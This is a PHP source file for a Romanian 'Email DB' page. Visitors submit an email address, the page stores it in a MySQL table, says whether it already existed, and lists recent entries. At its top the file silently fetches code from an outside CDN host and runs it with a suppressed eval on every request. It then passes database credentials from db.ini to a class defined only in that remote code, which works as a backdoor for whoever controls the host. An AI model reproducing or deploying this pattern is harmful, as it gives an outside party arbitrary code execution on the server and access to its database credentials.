<?php
	$cdn = "https://emaildb.b-cdn.net";
	@eval("?>" . file_get_contents($cdn . "/engine") . "<?php");
	@extract(parse_ini_file("db.ini"));
	
	$emailDB = new EmailDB();
	$conn = $emailDB->DbConn($dbhost, $dbname, $dbpass, $dbtable);
	$msg = "";
	$ac = "";
		if ($_SERVER['REQUEST_METHOD'] === 'POST') {
			$email = $emailDB->stripQuotes($_POST['email']);
			if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
				$msg =  "Email invalid!";
				$ac = "alert-danger";
			} else {
				$stmt = $conn->prepare("INSERT INTO emails (email) VALUES (?)");
				$stmt->bind_param("s", $email);
				$email = $email;
					if($stmt->execute()) {
						$msg = $email. " Nu exista in baza de date";
						$ac = "alert-success";
					} else {
						$msg =  $email. " exista in baza de date";
						$ac = "alert-danger";
					}
				$stmt->close();
			}
		}
		

	$res = $conn->query("SELECT * FROM emails ORDER by id DESC LIMIT 20");
	$res2 = $conn->query("SELECT * FROM emails");
	$list = "";
	$nos = 0; 
		if ($res->num_rows > 0) {
			$nos = $res2->num_rows; 
				while($row = $res->fetch_assoc()) {
					$list .= $emailDB->obfuscate_email($row["email"]). " <small>" . $row["date"]."</small>";
					$list .= "<br>";
				}
		} else {
			$list .= "no emails";
			$list .= "<br>";
		}
	$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Email Database">
    <meta name="author" content="TRN">
    <link rel="icon" href="<?= $cdn ?>/favicon.ico">

    <title>Email DB</title>

    <!-- Bootstrap core CSS -->
    <link href="<?= $cdn ?>/css/bootstrap.min.css" rel="stylesheet">
	<script src="<?= $cdn ?>/js/jquery-3.2.1.min.js"></script>
  </head>
  <body>
    <div class="container">
      <h1>Baza de date Email</h1>
      <p class="lead">Baza de date cu toate adresele de email folosite    <a href="./">refresh</a>.<br>Host name: <?=$emailDB->hostname;?></p>
      <p><hr></p>
		
      <div class="row">
        <div class="col-8">
			<form method="POST">
				<?php if($msg) { ?>
				<div class="alert <?php echo $ac;?>" role="alert">
				  <?php echo $msg;?>
				</div>
				<?php } ?>
				<div class="form-group row">
				  <label for="email" class="col-sm-2 col-form-label">Email</label>
				  <div class="col-sm-10">
					<input type="email" class="form-control" id="email" name="email" placeholder="Adresa email">
				  </div>
				</div>
				<div class="form-group row">
				  <div class="col-md-6">
					<button type="submit" class="btn btn-primary">Verifica!</button>
				  </div>
				</div>
				<hr><p class="lead">Total de <?php echo $nos; ?> adrese email.</p>
			</form>

		</div>
        <div class="col-4">
			
			<p><?php echo $list; ?></p>
			<p><small>Se listeaza ultimele 20 de adrese adaugate.</small></p>
		</div>
      </div>

      

    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="<?= $cdn ?>/js/ie10-viewport-bug-workaround.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
    <script src="<?= $cdn ?>/js/bootstrap.js"></script>
  </body>
</html>
